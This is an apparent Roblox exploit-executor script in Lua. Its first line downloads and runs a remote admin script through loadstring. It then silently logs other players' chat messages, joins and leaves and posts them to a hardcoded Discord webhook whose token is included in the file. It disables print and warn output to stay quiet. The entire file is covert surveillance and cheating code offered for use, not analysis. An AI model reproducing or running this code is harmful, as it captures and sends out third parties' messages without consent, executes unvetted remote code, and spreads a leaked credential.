loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()

LogPlayerJoins = false
LogPlayerChat = true
LogPlayerLeaves = false
DebugMode = false
Webhook = "https://discord.com/api/webhooks/1011057351954018305/vFx850B1aUPoQNfVZn4oTAVNsugtP4jhFbjZk3-7dfDB7GGbfO9PYzBw272Lp0561hr4"

if Webhook == "" then error("") end
if game.CoreGui:FindFirstChild("logginggge") then error("") end
ma = Instance.new("NumberValue", game.CoreGui)
ma.Name = "logginggge"
ms = ma.Value
ms = 1
random = game.JobId
GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
if DebugMode == false then function nothing() end print = nothing warn = nothing end

local a =
   game:GetService("HttpService"):JSONEncode(
   {
       ["content"] = tostring(game.Players.LocalPlayer.Name) .. " executed script, logging started.",
       ["avatar_url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432&format=png",
       ["username"] = GetName.Name ..
           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
   }
)
syn.request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = a})

game:GetService("Players").PlayerRemoving:Connect(
   function(player)
       if LogPlayerLeaves == true then
           if player.Name == game.Players.LocalPlayer.Name then
               local embed =
                   game:GetService("HttpService"):JSONEncode(
                   {
                       ["content"] = tostring(game.Players.LocalPlayer.Name) .. " left, logging ended.",
                       ["username"] = GetName.Name ..
                           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                   }
               )
               syn.request(
                   {
                       Url = Webhook,
                       Method = "POST",
                       Headers = {["Content-Type"] = "application/json"},
                       Body = embed
                   }
               )
           else
               if ms >= 30 then
                   print("reached max (leave)")
               else
                   ms = ms + 1
                   print(ms)
                   local embed =
                       game:GetService("HttpService"):JSONEncode(
                       {
                           ["content"] = tostring(player) .. " left.",
                           ["username"] = GetName.Name ..
                               " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                       }
                   )
                   syn.request(
                       {
                           Url = Webhook,
                           Method = "POST",
                           Headers = {["Content-Type"] = "application/json"},
                           Body = embed
                       }
                   )
               end
           end
       end
   end
)

game:GetService("Players").PlayerAdded:Connect(
   function(player)
       if LogPlayerJoins == true then
           if ms >= 30 then
               print("reached max (join)")
           else
               ms = ms + 1
               print(ms)
               local embed =
                   game:GetService("HttpService"):JSONEncode(
                   {
                       ["content"] = tostring(player) .. " joined the game.",
                       ["username"] = GetName.Name ..
                           " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                   }
               )
               syn.request(
                   {
                       Url = Webhook,
                       Method = "POST",
                       Headers = {["Content-Type"] = "application/json"},
                       Body = embed
                   }
               )
           end
       end
       player.Chatted:Connect(
           function(msg)
               if ms >= 30 then
                   print("reached max (chat)")
                   return
               else
                   if LogPlayerChat == true then
                       ms = ms + 1
                       print(ms)
                       local embed =
                           game:GetService("HttpService"):JSONEncode(
                           {
                               ["content"] = tostring(player) .. ": " .. tostring(msg),
                               ["username"] = GetName.Name ..
                                   " | Place Version: " ..
                                       tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                           }
                       )
                       syn.request(
                           {
                               Url = Webhook,
                               Method = "POST",
                               Headers = {["Content-Type"] = "application/json"},
                               Body = embed
                           }
                       )
                   end
               end
           end
       )
   end
)

local children = game:GetService("Players"):GetChildren()
for i, child in ipairs(children) do
   child.Chatted:Connect(
       function(msg)
           if ms >= 30 then
               print("reached max (chat)")
               return
           else
               if LogPlayerChat == true then
                   ms = ms + 1
                   print(ms)
                   local embed =
                       game:GetService("HttpService"):JSONEncode(
                       {
                           ["content"] = tostring(child) .. ": " .. tostring(msg),
                           ["username"] = GetName.Name ..
                               " | Place Version: " .. tostring(game.PlaceVersion) .. " (" .. tostring(random) .. ")"
                       }
                   )
                   syn.request(
                       {
                           Url = Webhook,
                           Method = "POST",
                           Headers = {["Content-Type"] = "application/json"},
                           Body = embed
                       }
                   )
               end
           end
       end
   )
end

while wait(60) do
   print(ms)
   ms = 1
   print("")
end
--yas
